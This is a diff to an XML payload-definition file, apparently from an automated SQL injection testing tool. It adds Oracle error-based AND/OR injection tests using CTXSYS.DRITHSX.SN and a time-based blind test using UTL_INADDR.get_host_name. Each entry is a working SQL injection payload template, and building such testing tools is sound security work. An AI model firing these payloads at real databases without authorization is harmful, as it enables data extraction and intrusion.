@@ -793,6 +793,25 @@ Formats:
     </test>
 
     <test>
+        <title>Oracle AND error-based - WHERE clause (ctxsys.drithsx.sn)</title>
+        <stype>2</stype>
+        <level>3</level>
+        <risk>0</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=CTXSYS.DRITHSX.SN([RANDNUM], '[DELIMITER_START]'||(REPLACE((%s),CHR(32),CHR(58)||CHR(95)||CHR(58)))||'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>AND [RANDNUM]=CTXSYS.DRITHSX.SN([RANDNUM],('[DELIMITER_START]'||(REPLACE((SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL),CHR(32),CHR(58)||CHR(95)||CHR(58)))||'[DELIMITER_STOP]'))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <test>
         <title>Firebird AND error-based - WHERE clause</title>
         <stype>2</stype>
         <level>2</level>
@@ -898,6 +917,25 @@ Formats:
         <vector>OR [RANDNUM]=UTL_INADDR.GET_HOST_ADDRESS('[DELIMITER_START]'||(REPLACE((%s),CHR(32),CHR(58)||CHR(95)||CHR(58)))||'[DELIMITER_STOP]')</vector>
         <request>
             <payload>OR [RANDNUM]=UTL_INADDR.GET_HOST_ADDRESS('[DELIMITER_START]'||(REPLACE((SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL),CHR(32),CHR(58)||CHR(95)||CHR(58)))||'[DELIMITER_STOP]')</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle OR error-based - WHERE clause (ctxsys.drithsx.sn)</title>
+        <stype>2</stype>
+        <level>3</level>
+        <risk>0</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <vector>OR [RANDNUM]=CTXSYS.DRITHSX.SN([RANDNUM], '[DELIMITER_START]'||(REPLACE((%s),CHR(32),CHR(58)||CHR(95)||CHR(58)))||'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>OR [RANDNUM]=CTXSYS.DRITHSX.SN([RANDNUM],('[DELIMITER_START]'||(REPLACE((SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL),CHR(32),CHR(58)||CHR(95)||CHR(58)))||'[DELIMITER_STOP]'))</payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -1377,6 +1415,24 @@ Formats:
         </response>
         <details>
             <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle AND time-based blind (heavy query)</title>
+        <stype>5</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>1</where>
+        <request>
+            <payload>AND (SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM DUAL)>0</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
         </details>
     </test>
 
